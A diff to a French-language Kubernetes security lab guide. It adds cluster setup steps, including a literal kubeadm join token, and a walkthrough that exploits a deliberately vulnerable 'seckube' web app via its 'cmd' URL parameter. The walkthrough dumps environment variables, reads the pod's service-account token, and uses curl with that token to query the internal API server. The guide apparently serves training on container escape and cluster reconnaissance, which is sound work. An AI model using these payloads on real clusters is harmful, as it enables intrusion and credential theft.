@@ -126,10 +126,20 @@
             - Swap désactivé, à l'aide de la commande suivante :
 
                     sudo swapoff -a && sudo sed -i '/ swap /s/^/#/' /etc/fstab
+            
+                Pour desactiver definitivement, executer aussi:
+
+                    systemctl --type swap
+                
+                puis
+                
+                    systemctl mask <type>.swap
 
             - Docker v20.10 installé, à l'aide du script suivant :
 
-                    https://github.com/rancher/install-docker/blob/master/dist/20.10.10.sh
+                https://github.com/rancher/install-docker/blob/master/dist/20.10.24.sh
+
+                    sudo usermod -aG docker <current_user>
 
             **NOEUD MASTER** :
 
@@ -168,6 +178,8 @@
 
                 Créer le fichier **/etc/systemd/system/kubelet.service.d/10-kubeadm.conf** avec le contenu suivant :
 
+                    sudo mkdir /etc/systemd/system/kubelet.service.d
+
                 ![Kubeadm](./images/10-kubeadm.png)
 
                 Créer un autre fichier **/usr/lib/systemd/system/kubelet.service** avec le contenu suivant à l'intérieur :
@@ -181,7 +193,13 @@
             
             - Initialiser le cluster:
 
-                    sudo kubeadm init --kubernetes-version=v1.23.7 --pod-network-cidr=10.244.235.0/16
+                    sudo kubeadm init --kubernetes-version=v1.23.7 --pod-network-cidr=10.244.235.0/8
+            
+            - Donner l'autorisation a l'utilisateur courant d'executer les commandes Kubernetes:
+
+                    mkdir -p $HOME/.kube
+                    sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config
+                    sudo chown $(id -u):$(id -g) $HOME/.kube/config
 
             - Installer un gestionnaire réseaux. Dans notre cas, nous utiliserons CALICO :
 
@@ -189,9 +207,11 @@
 
             **NOEUDS WORKER 1 ET 2**
 
-            Le processus d'installation d'un nœud de travail est exactement le même que pour le nœud maître, sauf que apres avoir demarré et activé kubelet.service, nous devons exécuter la commande fournie par **kubeadm init** du master.
+            Le processus d'installation d'un nœud de travail est exactement le même que pour le nœud maître, sauf que apres avoir demarré et activé kubelet.service, nous devons exécuter la commande fournie par **kubeadm init** du master :
 
-            Une fois le cluster pret, on peut le constater avec les commandes suivantes:
+                    sudo kubeadm join 192.168.115.10:6443 --token c8kswm.plvgx5h7owe18bpt --discovery-token-ca-cert-hash sha256:99db9da245c433bbb334ffdb271071f02a4ec80854545b082977fc47108db1a9
+
+            Une fois le cluster pret, on peut le constater avec les commandes suivantes dans la machine MASTER:
 
                 kubectl get nodes
             ![Get nodes](./images/Get_nodes.png)
@@ -323,13 +343,67 @@
 
             **a- Examen de la vulnérabilité**
 
-            Lorsqu'on ouvre l'application vulnérable dans notre navigateur à l'adresse http://192.168.115.10:31411. On arrive sur la page d'accueil de l'application, mais en faisant une recherche poussee sur le site web, on constate qu'on a une seconde page web a l'adresse http://192.168.115.10:31411/seckube, qui exploite la vulnérabilité RCE (Remote Code Execution) en passant un paramètre URL cmd. 
+            Lorsqu'on ouvre l'application vulnérable dans notre navigateur à l'adresse http://192.168.115.10:31411, on arrive sur la page d'accueil de l'application. Mais en faisant une recherche poussée sur le site web, on constate qu'on a une seconde page web a l'adresse http://192.168.115.10:31411/seckube, qui exploite la vulnérabilité RCE (Remote Code Execution) en passant un paramètre URL **cmd**. 
             
-            ![]()
+            ![Accueil](./images/Accueil_seckube.PNG)
             
-            Par exemple, la commande suivante exécute une commande de nom d'hôte et affiche la sortie de la console sur la page retournée : http://192.168.115.10:31411/seckube?cmd=hostname
+            Par exemple, l'url suivante exécute la commande **hostname** et affiche la sortie de la console sur la page retournée : http://192.168.115.10:31411/seckube?cmd=hostname
+
+            ![CMD hostname](./images/cmd_hostname.PNG)
+
+            Ceci prouve bien que le RCE fonctionne, alors utilisons-le pour obtenir des informations plus intéressantes. Remplacons le paramètre cmd par env pour imprimer les variables d'environnement des processus : http://192.168.115.10:31411/seckube?cmd=env
+
+            ![CMD env](./images/cmd_env.PNG)
+
+            En se basant sur les différents noms de variables commençant par KUBERNETES, il est assez sûr de supposer que ce processus s'exécute dans un conteneur, sur un cluster Kubernetes. De plus, étant donné que la commande hostname a retourné un nom préfixé par wordpress, la variable WORDPRESS_SERVICE_PORT=5000 signifie probablement qu'il y a un service Kubernetes qui écoute en interne sur le port 5000 et qu'une sorte de proxy qui traduit notre demande de port 31411 vers ce port. Enfin, la variable KUBERNETES_PORT=tcp://10.96.0.1:443 nous indique que l'adresse IP et le port internes de l'api-serveur Kubernetes sont 10.96.0.1:443.
+
+            La prochaine information que nous voulons obtenir est l'adresse IP du pod dans lequel nous nous exécutons, alors lançons hostname -i : http://192.168.115.10:31411/seckube?cmd=hostname%20-i
+
+            ![CMD hostname ip](./images/cmd_hostname_ip.PNG)
 
             **b- Accès au serveur api**
+
+            Chaque Pod Kubernetes dispose par défaut d'un jeton de service associé à son ServiceAccount. Par défaut, ce jeton est monté automatiquement dans chaque Pod dans le chemin **/var/run/secrets/kubernetes.io/serviceaccount/token**. Utilisons le RCE pour essayer d'imprimer ce jeton à l'aide de la commande **cat** : http://192.168.115.10:31411/seckube?cmd=cat%20/var/run/secrets/kubernetes.io/serviceaccount/token
+
+            ![CMD cat token](./images/cmd_cat_token.PNG)
+
+            Nous avons maintenant le jeton Pod, nous avons donc des informations d'identification avec lesquelles nous pouvons jouer. Cela peut être utilisé pour nous aider à explorer d'autres endroits dans le cluster.
+
+            Voyons maintenant si nous disposons d'une sorte d'outil que nous pouvons utiliser pour effectuer des appels web via notre RCE. Voyons si nous disposons de **curl** : http://192.168.115.10:31411/seckube?cmd=curl%20google.com
+
+            ![](./images/cmd_curl_google.PNG)
+
+            On peut constater que nous avons bien access a l'outil curl.
+
+            Ensuite, nous allons prendre tout ce que nous avons trouvee dans le conteneur et l'appliquer pour en sortir. Nous allons utiliser **curl** et le **token credential** pour essayer de nous connecter au serveur api de Kubernetes et lui demander les endpoints du cluster. Les détails de la connexion sont les suivants :
+
+            - **Host** : la valeur de la variable KUBERNETES_PORT
+            - **URI (identifiant uniforme de ressource)** : ici **endpoints**, dans le namespace par defaut, a l'emplacement **/api/v1/namespaces/default/endpoints**
+            - **En-tête** : Un **Authorization: Bearer** contenant le contenu du fichier de jeton trouvee plus haut
+            - **CA Cert** : Le certificat de l'autorité de certification qui, nous pouvons le supposer, se trouve dans l'emplacement par défaut, au même endroit que notre fichier de jetons, et s'appelle ca.crt.
+
+            L'URL est le suivant : http://192.168.115.10:31411/seckube?cmd=curl%20--cacert%20/var/run/secrets/kubernetes.io/serviceaccount/ca.crt%20-H%20%22Authorization:%20Bearer%20$(cat%20/var/run/secrets/kubernetes.io/serviceaccount/token)%22%20https://10.96.0.1/api/v1/namespaces/default/endpoints
+
+            ![](./images/cmd_curl_endpoints.PNG)
+
+            Cette commande aboutit et la section qui nous interresse est :
+
+                    "subsets": [
+                      {
+                        "addresses": [
+                          {
+                            "ip": "192.168.115.10"
+                          }
+                        ],
+                        "ports": [
+                          {
+                            "name": "https",
+                            "port": 6443,
+                            "protocol": "TCP"
+                          }
+                        ]
+                      }
+                    ]
             
             **c- Cluster fact finding**
 
